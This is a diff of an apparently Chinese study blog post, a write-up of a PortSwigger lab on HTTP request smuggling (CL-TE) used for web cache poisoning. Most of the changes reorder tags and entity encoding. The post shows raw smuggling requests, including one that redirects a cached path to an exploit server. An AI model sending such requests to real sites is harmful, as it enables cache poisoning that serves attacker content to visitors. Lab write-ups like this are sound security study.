@@ -27,9 +27,9 @@
 <meta property="article:published_time" content="2022-07-28T03:33:06.000Z">
 <meta property="article:modified_time" content="2022-08-12T06:35:24.693Z">
 <meta property="article:author" content="Blackwatch">
+<meta property="article:tag" content="学习笔记">
 <meta property="article:tag" content="web缓存漏洞">
 <meta property="article:tag" content="Http请求走私">
-<meta property="article:tag" content="学习笔记">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://blackwatch219.github.io/2022/07/28/Http-Sumggling-%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/1.png">
   
@@ -244,14 +244,14 @@
 </blockquote>
 <h1 id="Http-Sumggling-缓存漏洞"><a href="#Http-Sumggling-缓存漏洞" class="headerlink" title="Http Sumggling 缓存漏洞"></a>Http Sumggling 缓存漏洞</h1><h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>依旧以<code>Lab: Exploiting HTTP request smuggling to perform web cache poisoning</code>为靶场</p>
 <h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>判断是否存在走私，确定为CL-TE</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: anything</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/next?postId=3 HTTP/1.1</span><br><span class="line">Host: anything</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
 
 <p>第一次请求为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/07/28/Http-Sumggling-%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/4.png"></p>
 <p>第二次请求为下半段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: anything</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /post/next?postId=3 HTTP/1.1</span><br><span class="line">Host: anything</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/07/28/Http-Sumggling-%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/5.png"></p>
 <p>可以看到存在302跳转</p>
@@ -261,7 +261,7 @@
 <p>可以看到<code>X-Cache</code>为miss，这样我们就可以利用修改，进行缓存投毒</p>
 <ul>
 <li><p>先点击send post包</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 0a9b0056035fcd3ec0c40506003b00aa.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 195</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: https:&#x2F;&#x2F;exploit-0a6d001c033acd49c0fa05c101130045.web-security-academy.net&#x2F;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a9b0056035fcd3ec0c40506003b00aa.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 195</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/next?postId=3 HTTP/1.1</span><br><span class="line">Host: https://exploit-0a6d001c033acd49c0fa05c101130045.web-security-academy.net/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
 
 <p>访问到第一部分</p>
 <p><img src="/2022/07/28/Http-Sumggling-%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/4.png"></p>
@@ -314,15 +314,15 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">学习笔记</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">web缓存漏洞</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Http请求走私</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">学习笔记</a>
         		</li>
       		
 		</ul>
@@ -554,18 +554,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">web缓存漏洞</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Http请求走私</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">writeup</a>
               </li>
              
@@ -575,6 +563,18 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CSP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">web缓存漏洞</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Http请求走私</a>
               </li>
              
               <li class="article-tag-list-item">
